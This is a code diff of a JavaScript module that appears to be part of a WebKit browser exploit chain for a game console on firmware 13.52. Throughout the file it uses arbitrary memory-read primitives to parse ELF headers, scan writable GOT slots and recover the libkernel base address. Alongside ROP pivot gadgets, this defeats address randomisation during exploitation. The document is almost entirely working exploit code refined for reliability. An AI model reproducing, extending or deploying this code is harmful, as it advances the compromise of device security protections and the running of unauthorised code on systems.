@@ -1,20 +1,13 @@
 /**
- * Resolve libSceLibKernelWeb on 13.52 — never brute-scan GOT (OOM).
- * Paths: cache → ELF DT_PLTGOT → PLT xrefs in mapped .text.
+ * libkernel on 13.52 — scan ONLY ELF mapped RW (.got), never PLT-guessed GOT.
+ * Max 2 reads per slot; no walk-back; reject webkit/internal pointers before follow.
  */
 import { int64 } from "./int64.js";
 import { webkitRvaMax } from "./pivot_gadgets.js";
 
 const ELF_MAGIC = 0x464c457f;
 const PT_LOAD = 1;
-const PT_DYNAMIC = 2;
-const DT_NULL = 0;
-const DT_PLTGOT = 3;
-const DT_SYMTAB = 6;
-const DT_STRTAB = 10;
-const DT_STRSZ = 11;
-const DT_JMPREL = 23;
-const DT_PLTRELSZ = 2;
+const PF_W = 2;
 
 const SS_LK_BASE = "wk-libkernelBase";
 const SS_IAT_RVA = "wk-imp-error-rva";
@@ -34,6 +27,11 @@ function read2p(p, addr) {
     try { return p.read2(addr); } catch (_) { return null; }
 }
 
+function read1p(p, addr) {
+    if (!addr) return null;
+    try { return p.read1(addr); } catch (_) { return null; }
+}
+
 function parseAddrSync(raw) {
     if (!raw) return null;
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -47,23 +45,12 @@ function u64FromRead8(w) {
     return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
 }
 
-function i32At(bytes, off) {
-    return (bytes[off] | (bytes[off + 1] << 8)
-        | (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >> 0;
+function iatCap(off) {
+    return webkitRvaMax(off);
 }
 
-function bytesFromRead8(w, out, at) {
-    at = at || 0;
-    let v = w.low >>> 0;
-    for (let i = 0; i < 4; i++) {
-        out[at + i] = v & 0xff;
-        v >>>= 8;
-    }
-    v = w.hi >>> 0;
-    for (let i = 4; i < 8; i++) {
-        out[at + i] = v & 0xff;
-        v >>>= 8;
-    }
+function rvaAllowed(rva, off) {
+    return rva >= 0x10000 && rva <= iatCap(off);
 }
 
 export function isGetpidStub(v) {
@@ -73,17 +60,18 @@ export function isGetpidStub(v) {
         && (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) === 20;
 }
 
+/** Cheap prologue check — one read1 only. */
 export function isLibkernelPrologue(p, lk) {
-    if (!lk) return false;
-    const w0 = read4p(p, lk);
-    const w1 = read4p(p, lk.add32(4));
-    return w0 != null && w1 != null
-        && (w0 & 0xff) === 0xb8
-        && (w1 & 0xffff) === 0x050f;
+    if (!lk || lk.hi < 0x8) return false;
+    const b0 = read1p(p, lk);
+    return b0 === 0xb8;
 }
 
-function iatRvaAllowed(rva, off) {
-    return rva >= 0x10000 && rva <= webkitRvaMax(off);
+export function saveLibkernelSession(lk, iatRva) {
+    try {
+        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
+        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
+    } catch (_) { }
 }
 
 function loadSessionIatRva() {
@@ -95,149 +83,107 @@ function loadSessionIatRva() {
     }
 }
 
-export function saveLibkernelSession(lk, iatRva) {
-    try {
-        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
-        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
-    } catch (_) { }
+/** True if ptr looks like an address inside the mapped webkit image. */
+function ptrInWebkitImage(fnPtr, webkitBase, off) {
+    if (!fnPtr || !webkitBase) return false;
+    if (fnPtr.hi !== webkitBase.hi) return false;
+    const cap = iatCap(off);
+    const lo = webkitBase.low >>> 0;
+    const fl = fnPtr.low >>> 0;
+    if (fl < lo) return false;
+    return (fl - lo) <= cap;
 }
 
-function lkFromGotPtr(p, fnPtr, off, iatRva) {
-    if (!fnPtr || fnPtr.hi < 0x8) return null;
+/** External userland code pointer — not null, not webkit interior. */
+function plausibleExtPtr(fnPtr, webkitBase, off) {
+    if (!fnPtr) return false;
+    if (fnPtr.hi < 0x8) return false;
+    if (fnPtr.hi === 0 && fnPtr.low < 0x100000) return false;
+    if (ptrInWebkitImage(fnPtr, webkitBase, off)) return false;
+    return true;
+}
+
+function lkAligned(lk) {
+    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+}
+
+/**
+ * Verify one GOT slot — at most 2 reads beyond the initial read8:
+ * read8(slot) + read1(module base or fn entry).
+ */
+function safeVerifyGotSlot(p, webkitBase, off, rva) {
+    if (!rvaAllowed(rva, off)) return null;
+
+    const fnPtr = read8p(p, webkitBase.add32(rva));
+    if (!plausibleExtPtr(fnPtr, webkitBase, off)) return null;
+
+    if (isGetpidStub(fnPtr) && off.k_stubs && off.k_stubs[20] != null) {
+        const lk = fnPtr.sub32(off.k_stubs[20]);
+        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
+            return { lk, iatRva: rva, errorFn: fnPtr, via: "getpid" };
+        return null;
+    }
+
+    const entryB0 = read1p(p, fnPtr);
+    if (entryB0 !== 0xb8) return null;
 
     if (off.k__error != null) {
         const lk = fnPtr.sub32(off.k__error);
-        if (isLibkernelPrologue(p, lk))
-            return { lk, iatRva, errorFn: fnPtr, via: "error" };
+        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
+            return { lk, iatRva: rva, errorFn: fnPtr, via: "error" };
     }
 
-    if (off.k_stubs && off.k_stubs[20] != null && isGetpidStub(fnPtr)) {
-        const lk = fnPtr.sub32(off.k_stubs[20]);
-        if (isLibkernelPrologue(p, lk))
-            return { lk, iatRva, errorFn: fnPtr, via: "getpid-got" };
-    }
+    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
+    if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
+        return { lk: pageBase, iatRva: rva, errorFn: fnPtr, via: "page" };
 
-    const pageLo = (fnPtr.low >>> 0) & ~0x3fff;
-    const base = new int64(pageLo, fnPtr.hi >>> 0);
-    if (isLibkernelPrologue(p, base))
-        return { lk: base, iatRva, errorFn: fnPtr, via: "page" };
-
-    for (let back = 0x4000; back <= 0x200000; back += 0x4000) {
-        const tryBase = fnPtr.sub32(back);
-        if (isLibkernelPrologue(p, tryBase))
-            return { lk: tryBase, iatRva, errorFn: fnPtr, via: "walk" };
-    }
     return null;
 }
 
-function lkFromIatSlot(p, webkitBase, rva, off, read8) {
-    const fnPtr = read8(p, webkitBase.add32(rva));
-    if (!fnPtr || (fnPtr.hi === 0 && fnPtr.low < 0x100000)) return null;
-    const hit = lkFromGotPtr(p, fnPtr, off, rva);
-    if (!hit) return null;
-    return { lk: hit.lk, iatRva: hit.iatRva, errorFn: hit.errorFn, via: hit.via };
-}
+/** PT_LOAD segments that are writable and within mapped cap (ELF header reads only). */
+export function elfMappedRwRanges(p, webkitBase, off) {
+    const cap = iatCap(off);
+    if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
+    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return [];
 
-/** Code scan regions — skip 0x600000–0x1200000 middle (slow, rarely GOT xrefs). */
-function iatCodeRegions(off) {
-    const cap = webkitRvaMax(off);
-    const g5 = off.wk_PUSH_RDX_POP_RSP_RET || 0x13ec77a;
-    const highLo = Math.max(0x1180000, g5 - 0x300000);
-    const highHi = Math.min(cap, g5 + 0x300000);
-    const regions = [
-        { lo: 0x10000, hi: Math.min(0x600000, cap), tag: "low" },
-        { lo: highLo, hi: highHi, tag: "high" },
-    ];
-    if (0x600000 < highLo)
-        regions.push({ lo: 0x600000, hi: Math.min(highLo, cap), tag: "mid" });
-    return regions.filter(r => r.lo < r.hi);
-}
-
-function iatBeginCodePhase(state, off) {
-    state.regions = iatCodeRegions(off);
-    state.regionIdx = 0;
-    state.cursor = state.regions[0].lo;
-    state.maxRva = state.regions[0].hi;
-    state.regionTag = state.regions[0].tag;
-}
-
-/** Parse ELF64 PT_DYNAMIC for DT_PLTGOT (few reads). */
-export function elfGotPltRva(p, webkitBase, off) {
-    const cap = webkitRvaMax(off);
-    if (read4p(p, webkitBase) !== ELF_MAGIC) return null;
-    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return null;
     const ePhoff = read4p(p, webkitBase.add32(0x20));
     const ePhnum = read2p(p, webkitBase.add32(0x38));
     const ePhentsize = read2p(p, webkitBase.add32(0x36));
-    if (ePhoff == null || !ePhnum || !ePhentsize) return null;
+    if (ePhoff == null || !ePhnum || !ePhentsize) return [];
 
-    let dynVaddr = null;
-    let dynMemsz = null;
+    const ranges = [];
     for (let i = 0; i < ePhnum; i++) {
         const ph = ePhoff + i * ePhentsize;
         const pType = read4p(p, webkitBase.add32(ph));
-        if (pType === PT_DYNAMIC) {
-            const w0 = read8p(p, webkitBase.add32(ph + 0x10));
-            const w1 = read8p(p, webkitBase.add32(ph + 0x28));
-            if (!w0 || !w1) return null;
-            dynVaddr = u64FromRead8(w0);
-            dynMemsz = u64FromRead8(w1);
-            break;
-        }
-    }
-    if (dynVaddr == null || !dynMemsz) return null;
+        if (pType !== PT_LOAD) continue;
+        const pFlags = read4p(p, webkitBase.add32(ph + 4));
+        if ((pFlags & PF_W) === 0) continue;
 
-    const dynRva = Number(dynVaddr & 0xffffffffn);
-    if (!iatRvaAllowed(dynRva, off)) return null;
+        const wVaddr = read8p(p, webkitBase.add32(ph + 0x10));
+        const wMemsz = read8p(p, webkitBase.add32(ph + 0x28));
+        if (!wVaddr || !wMemsz) continue;
 
-    let pltgot = null;
-    const tags = Math.min(Number(dynMemsz / 16n), 256);
-    for (let t = 0; t < tags; t++) {
-        const tagOff = dynRva + t * 16;
-        const tagW = read8p(p, webkitBase.add32(tagOff));
-        const valW = read8p(p, webkitBase.add32(tagOff + 8));
-        if (!tagW || !valW) break;
-        const tag = Number(u64FromRead8(tagW) & 0xffffffffn);
-        if (tag === DT_NULL) break;
-        if (tag === DT_PLTGOT)
-            pltgot = Number(u64FromRead8(valW) & 0xffffffffn);
+        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
+        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
+        if (lo >= cap) continue;
+        if (hi > cap) hi = cap;
+        if (lo + 0x1000 >= hi) continue;
+        ranges.push({ lo: lo & ~7, hi, tag: "rw" + i });
     }
-    if (pltgot == null || !iatRvaAllowed(pltgot, off)) return null;
-    return pltgot;
+    ranges.sort((a, b) => a.lo - b.lo);
+    return ranges;
 }
 
-/** Walk .got.plt slots from DT_PLTGOT (bounded reads). */
-export function scanGotPltSlots(p, webkitBase, off, gotRva, opts) {
-    opts = opts || {};
-    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
-    const maxSlots = opts.maxSlots || 384;
-    const step = 8;
-    for (let i = 0; i < maxSlots; i++) {
-        const rva = gotRva + i * step;
-        if (!iatRvaAllowed(rva, off)) break;
-        const hit = lkFromIatSlot(p, webkitBase, rva, off, read8);
-        if (hit) return Object.assign(hit, { source: "got-plt+" + i });
+function rvaInRwRanges(rva, ranges) {
+    for (let i = 0; i < ranges.length; i++) {
+        if (rva >= ranges[i].lo && rva < ranges[i].hi) return true;
     }
-    return null;
-}
-
-function queueAndVerifyGot(p, webkitBase, off, state, gotRva) {
-    if (!iatRvaAllowed(gotRva, off)) return null;
-    const key = gotRva.toString(16);
-    if (state.gotSeen[key]) return null;
-    state.gotSeen[key] = 1;
-    if (state.gotQueue.length < 512)
-        state.gotQueue.push(gotRva);
-    if (state.gotVerifyIdx == null) state.gotVerifyIdx = 0;
-    const hit = lkFromIatSlot(p, webkitBase, gotRva, off, read8p);
-    state.gotVerifyIdx = state.gotQueue.length;
-    return hit;
+    return false;
 }
 
 function iatHitReturn(state, hit, source) {
     saveLibkernelSession(hit.lk, hit.iatRva);
     state.done = true;
-    state.best = hit;
     return {
         done: true,
         lk: hit.lk,
@@ -247,229 +193,88 @@ function iatHitReturn(state, hit, source) {
     };
 }
 
-function scanXrefsInWindow(p, webkitBase, state, baseRva, buf, cap, off) {
-    for (let start = 0; start <= 8; start++) {
-        if (buf[start] === 0xff && buf[start + 1] === 0x15) {
-            const disp = i32At(buf, start + 2);
-            const hit = queueAndVerifyGot(p, webkitBase, off, state,
-                baseRva + start + 6 + disp);
-            if (hit) return hit;
-        }
-        if (start <= 7 && buf[start] === 0x48 && buf[start + 1] === 0x8b
-            && (buf[start + 2] === 0x3d || buf[start + 2] === 0x05)) {
-            const disp = i32At(buf, start + 3);
-            const hit = queueAndVerifyGot(p, webkitBase, off, state,
-                baseRva + start + 7 + disp);
-            if (hit) return hit;
-        }
-    }
-    return null;
-}
-
-function verifyPendingGot(p, webkitBase, off, state, maxChecks) {
-    if (state.gotVerifyIdx == null) state.gotVerifyIdx = 0;
-    let checks = 0;
-    while (state.gotVerifyIdx < state.gotQueue.length && checks < maxChecks) {
-        const rva = state.gotQueue[state.gotVerifyIdx++];
-        const hit = lkFromIatSlot(p, webkitBase, rva, off, read8p);
-        if (hit) return hit;
-        checks++;
-    }
-    return null;
+function beginRwScan(state, ranges) {
+    state.phase = "rw";
+    state.rwRanges = ranges;
+    state.rangeIdx = 0;
+    state.cursor = ranges[0].lo;
+    state.endRva = ranges[0].hi;
+    state.slots = 0;
 }
 
 /**
- * Chunked PLT-xref scan — reads .text only, then verifies GOT slots.
- * Replaces brute GOT sweep (was ~1.5M data reads → OOM).
+ * Chunked RW-GOT scan — only mapped ELF writable segments.
  */
 export function scanErrorIatChunk(p, webkitBase, off, state) {
-    const cap = webkitRvaMax(off);
     if (!state) {
-        state = {
-            phase: "elf",
-            cursor: 0x10000,
-            maxRva: cap,
-            step: 8,
-            chunk: 128,
-            gotQueue: [],
-            gotSeen: {},
-            gotIdx: 0,
-            best: null,
-            win16: new Uint8Array(16),
-            done: false,
-        };
+        state = { phase: "ranges", done: false };
     }
 
-    if (state.phase === "elf") {
-        const gotRva = elfGotPltRva(p, webkitBase, off);
-        if (gotRva != null) {
-            state.gotPlt = gotRva;
-            state.phase = "gotplt";
-            return { done: false, state, phase: "elf-hit", gotPlt: gotRva };
+    if (state.phase === "ranges") {
+        const ranges = elfMappedRwRanges(p, webkitBase, off);
+        if (!ranges.length) {
+            state.done = true;
+            return { done: true, lk: null, state, phase: "no-rw" };
         }
-        state.phase = "code";
-        iatBeginCodePhase(state, off);
-        return { done: false, state, phase: "elf-miss" };
-    }
-
-    if (state.phase === "gotplt") {
-        const maxSlots = 384;
-        if (state.gotSlot == null) state.gotSlot = 0;
-        let checks = 0;
-        while (state.gotSlot < maxSlots && checks < 24) {
-            const rva = state.gotPlt + state.gotSlot * 8;
-            state.gotSlot++;
-            checks++;
-            if (!iatRvaAllowed(rva, off)) break;
-            const hit = lkFromIatSlot(p, webkitBase, rva, off, read8p);
-            if (hit)
-                return iatHitReturn(state, hit, "got-plt+" + (state.gotSlot - 1));
-        }
-        if (state.gotSlot >= maxSlots
-            || !iatRvaAllowed(state.gotPlt + state.gotSlot * 8, off)) {
-            state.phase = "code";
-            iatBeginCodePhase(state, off);
-            return { done: false, state, phase: "gotplt-miss" };
-        }
+        beginRwScan(state, ranges);
         return {
             done: false,
             state,
-            phase: "gotplt",
-            gotIdx: state.gotSlot,
+            phase: "rw-start",
+            ranges: ranges.map(r => "+0x" + r.lo.toString(16)
+                + "…+0x" + r.hi.toString(16)).join(" "),
         };
     }
 
-    if (state.phase === "code") {
-        const absCap = webkitRvaMax(off);
+    if (state.phase === "rw") {
         let steps = 0;
-        while (state.cursor < state.maxRva && state.cursor < absCap && steps < state.chunk) {
-            const w0 = read8p(p, webkitBase.add32(state.cursor));
-            if (w0) {
-                bytesFromRead8(w0, state.win16, 0);
-                const w1 = read8p(p, webkitBase.add32(state.cursor + 8));
-                if (w1) bytesFromRead8(w1, state.win16, 8);
-                const live = scanXrefsInWindow(p, webkitBase, state,
-                    state.cursor, state.win16, cap, off);
-                if (live)
-                    return iatHitReturn(state, live, "live");
+        while (state.cursor < state.endRva && steps < 24) {
+            if (rvaInRwRanges(state.cursor, state.rwRanges)) {
+                state.slots++;
+                const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
+                if (hit)
+                    return iatHitReturn(state, hit, "rw-got");
             }
-            state.cursor += state.step;
+            state.cursor += 8;
             steps++;
         }
-        const pending = verifyPendingGot(p, webkitBase, off, state, 16);
-        if (pending)
-            return iatHitReturn(state, pending, "pending");
-        if (state.cursor >= state.maxRva || state.cursor >= absCap) {
-            const nextIdx = (state.regionIdx || 0) + 1;
-            const skipMid = state.gotQueue.length >= 48
-                && state.regionTag === "low"
-                && state.regions
-                && nextIdx < state.regions.length
-                && state.regions[nextIdx].tag === "mid";
-            const jumpIdx = skipMid ? nextIdx + 1 : nextIdx;
-            if (state.regions && jumpIdx < state.regions.length) {
-                state.regionIdx = jumpIdx;
-                state.cursor = state.regions[jumpIdx].lo;
-                state.maxRva = state.regions[jumpIdx].hi;
-                state.regionTag = state.regions[jumpIdx].tag;
-                const skipped = skipMid ? " (skip mid — q=" + state.gotQueue.length + ")" : "";
+
+        if (state.cursor >= state.endRva) {
+            const next = (state.rangeIdx || 0) + 1;
+            if (next < state.rwRanges.length) {
+                state.rangeIdx = next;
+                state.cursor = state.rwRanges[next].lo;
+                state.endRva = state.rwRanges[next].hi;
                 return {
                     done: false,
                     state,
-                    phase: "code-region",
-                    region: state.regionTag,
+                    phase: "rw-region",
+                    region: state.rwRanges[next].tag,
                     cursor: state.cursor,
-                    queued: state.gotQueue.length,
-                    note: skipped,
+                    end: state.endRva,
                 };
             }
-            state.phase = "verify";
-            state.gotIdx = state.gotVerifyIdx || 0;
-            return {
-                done: false,
-                state,
-                phase: "code-done",
-                queued: state.gotQueue.length,
-            };
-        }
-        return {
-            done: false,
-            state,
-            phase: "code",
-            cursor: state.cursor,
-            queued: state.gotQueue.length,
-            region: state.regionTag || "code",
-            end: state.maxRva,
-            verified: state.gotVerifyIdx || 0,
-        };
-    }
-
-    if (state.phase === "verify") {
-        const hit = verifyPendingGot(p, webkitBase, off, state, 48);
-        if (hit)
-            return iatHitReturn(state, hit, "plt-xref");
-        if ((state.gotVerifyIdx || 0) >= state.gotQueue.length) {
             state.done = true;
-            if (state.best) {
-                saveLibkernelSession(state.best.lk, state.best.iatRva);
-                return {
-                    done: true,
-                    lk: state.best.lk,
-                    iatRva: state.best.iatRva,
-                    source: "plt-xref" + (state.best.via ? "/" + state.best.via : ""),
-                    state,
-                };
-            }
-            if (state.regions && !state.midRetried) {
-                const mid = state.regions.find(r => r.tag === "mid");
-                if (mid && state.gotQueue.length < 48) {
-                    state.midRetried = true;
-                    state.phase = "code";
-                    state.regionIdx = state.regions.indexOf(mid);
-                    state.cursor = mid.lo;
-                    state.maxRva = mid.hi;
-                    state.regionTag = "mid";
-                    return { done: false, state, phase: "code-retry-mid", queued: 0 };
-                }
-            }
-            return { done: true, state, lk: null };
+            return { done: true, lk: null, state, phase: "rw-miss", slots: state.slots };
         }
+
         return {
             done: false,
             state,
-            phase: "verify",
-            left: state.gotQueue.length - (state.gotVerifyIdx || 0),
+            phase: "rw",
+            cursor: state.cursor,
+            end: state.endRva,
+            slots: state.slots,
+            region: state.rwRanges[state.rangeIdx].tag,
         };
     }
 
     state.done = true;
-    return { done: true, state, lk: null };
+    return { done: true, lk: null, state };
 }
 
-/** One-shot resolve using ELF + bounded GOT (no full scan loop). */
-export function resolveLibkernelFast(p, webkitBase, off, opts) {
-    opts = opts || {};
-    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
-    const log = opts.log || (() => {});
-    const gotRva = elfGotPltRva(p, webkitBase, off);
-    if (gotRva != null) {
-        log("LK-ELF", "DT_PLTGOT +0x" + gotRva.toString(16));
-        const hit = scanGotPltSlots(p, webkitBase, off, gotRva, { read8, maxSlots: 384 });
-        if (hit) {
-            saveLibkernelSession(hit.lk, hit.iatRva);
-            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: hit.source };
-        }
-    }
-
-    return { ok: false, error: "need chunked PLT xref scan" };
-}
-
-/**
- * Resolve libkernel base — never reads webkit above webkitRvaMax.
- */
 export function resolveLibkernel(p, webkitBase, off, opts) {
     opts = opts || {};
-    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
     const log = opts.log || (() => {});
 
     if (!off || off.k__error == null)
@@ -483,34 +288,41 @@ export function resolveLibkernel(p, webkitBase, off, opts) {
                 log("LK-CACHE", "libkernel " + lk);
                 return { ok: true, lk, source: "cache" };
             }
-            log("LK-CACHE-BAD", "stale " + rawLk);
+            log("LK-CACHE-BAD", "stale " + rawLk + " — cleared");
+            sessionStorage.removeItem(SS_LK_BASE);
         }
     } catch (_) { }
 
     const savedIat = loadSessionIatRva();
-    if (savedIat != null && iatRvaAllowed(savedIat, off)) {
-        const hit = lkFromIatSlot(p, webkitBase, savedIat, off, read8);
+    if (savedIat != null && rvaAllowed(savedIat, off)) {
+        const hit = safeVerifyGotSlot(p, webkitBase, off, savedIat);
         if (hit) {
             saveLibkernelSession(hit.lk, hit.iatRva);
             log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
-            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session-iat" };
+            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session" };
         }
     }
 
-    const tableIat = off.wk___imp___error;
-    if (tableIat != null && iatRvaAllowed(tableIat, off)) {
-        const hit = lkFromIatSlot(p, webkitBase, tableIat, off, read8);
-        if (hit) {
-            saveLibkernelSession(hit.lk, hit.iatRva);
-            log("LK-IAT", "table +0x" + tableIat.toString(16) + " → " + hit.lk);
-            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "table" };
-        }
-    } else if (tableIat != null) {
-        log("LK-BLOCK", "13.00 IAT +0x" + tableIat.toString(16) + " unmapped");
-    }
+    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — use Scan IAT or paste libkernel");
+    return { ok: false, error: "tap Scan IAT (RW GOT) or paste libkernel base" };
+}
 
-    const fast = resolveLibkernelFast(p, webkitBase, off, { read8, log });
-    if (fast.ok) return fast;
+/** Validate user-pasted libkernel base (1 read). */
+export function verifyManualLibkernel(p, lk) {
+    if (!lk || !isLibkernelPrologue(p, lk))
+        return { ok: false, error: "not libkernel prologue (want 0xb8 @ base)" };
+    saveLibkernelSession(lk, null);
+    return { ok: true, lk };
+}
 
-    return { ok: false, error: "tap Scan IAT (PLT xref — not brute GOT)" };
+export function elfGotPltRva() {
+    return null;
+}
+
+export function scanGotPltSlots() {
+    return null;
+}
+
+export function resolveLibkernelFast() {
+    return { ok: false, error: "use RW GOT scan" };
 }
